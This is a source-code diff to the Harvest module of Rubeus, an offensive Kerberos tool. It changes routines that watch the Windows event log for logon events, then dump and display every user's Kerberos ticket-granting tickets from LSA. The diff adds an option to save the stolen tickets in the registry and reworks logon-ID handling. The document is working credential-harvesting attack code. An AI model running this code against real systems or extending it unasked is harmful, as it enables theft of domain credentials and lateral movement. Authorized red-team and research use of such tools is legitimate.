@@ -9,7 +9,7 @@ namespace Rubeus
 {
     public class Harvest
     {
-        public static void HarvestTGTs(int intervalMinutes)
+        public static void HarvestTGTs(int intervalMinutes, string registryBasePath)
         {
             // First extract all TGTs then monitor the event log (indefinitely) for 4624 logon events
             //  every 'intervalMinutes' and dumps TGTs JUST for the specific logon IDs (LUIDs) based on the event log.
@@ -26,10 +26,10 @@ namespace Rubeus
             Console.WriteLine("\r\n[*] Monitoring every {0} minutes for 4624 logon events\r\n", intervalMinutes);
 
             // used to keep track of LUIDs we've already dumped
-            var seenLUIDs = new Dictionary<UInt32, bool>();
+            var seenLUIDs = new Dictionary<ulong, bool>();
 
             // get the current set of TGTs
-            List<KRB_CRED> creds = LSA.ExtractTGTs();
+            List<KRB_CRED> creds = LSA.ExtractTGTs(new Interop.LUID());
 
             while (true)
             {
@@ -85,8 +85,8 @@ namespace Rubeus
                                 try
                                 {
                                     // check if we've seen this LUID before
-                                    UInt32 luid = Convert.ToUInt32(match2.Groups["id"].Value, 16);
-                                    if (!seenLUIDs.ContainsKey(luid))
+                                    Interop.LUID luid = new Interop.LUID(match2.Groups["id"].Value);
+                                    if (!seenLUIDs.ContainsKey((ulong)luid))
                                     {
                                         seenLUIDs[luid] = true;
                                         // if we haven't seen it, extract any TGTs for that particular logon ID and add to the cache
@@ -133,12 +133,15 @@ namespace Rubeus
 
                 Console.WriteLine("\r\n[*] {0} - Current usable TGTs:\r\n", DateTime.Now);
                 LSA.DisplayTGTs(creds);
-
+                if (registryBasePath != null)
+                {
+                    LSA.SaveTicketsToRegistry(creds, registryBasePath);
+                }
                 System.Threading.Thread.Sleep(intervalMinutes * 60 * 1000);
             }
         }
 
-        public static void Monitor4624(int intervalSeconds, string targetUser)
+        public static void Monitor4624(int intervalSeconds, string targetUser, string registryBasePath = null)
         {
             // monitors the event log (indefinitely) for 4624 logon events every 'intervalSeconds' and dumps TGTs JUST for the specific
             //  logon IDs (LUIDs) based on the event log. Can optionally only extract for a targeted user.
@@ -150,7 +153,7 @@ namespace Rubeus
             }
 
             // used to keep track of LUIDs we've already dumped
-            var seenLUIDs = new Dictionary<UInt32, bool>();
+            var seenLUIDs = new Dictionary<ulong, bool>();
 
             Console.WriteLine("[*] Action: TGT Monitoring");
             Console.WriteLine("[*] Monitoring every {0} seconds for 4624 logon events", intervalSeconds);
@@ -219,12 +222,12 @@ namespace Rubeus
                                     try
                                     {
                                         // check if we've seen this LUID before
-                                        UInt32 luid = Convert.ToUInt32(match2.Groups["id"].Value, 16);
-                                        if (!seenLUIDs.ContainsKey(luid))
+                                        Interop.LUID luid = new Interop.LUID(match2.Groups["id"].Value);
+                                        if (!seenLUIDs.ContainsKey((ulong)luid))
                                         {
                                             seenLUIDs[luid] = true;
                                             // if we haven't seen it, extract any TGTs for that particular logon ID
-                                            LSA.ListKerberosTicketData(luid, "krbtgt", true);
+                                            LSA.ListKerberosTicketData(luid, "krbtgt", true, registryBasePath);
                                         }
                                     }
                                     catch (Exception e)
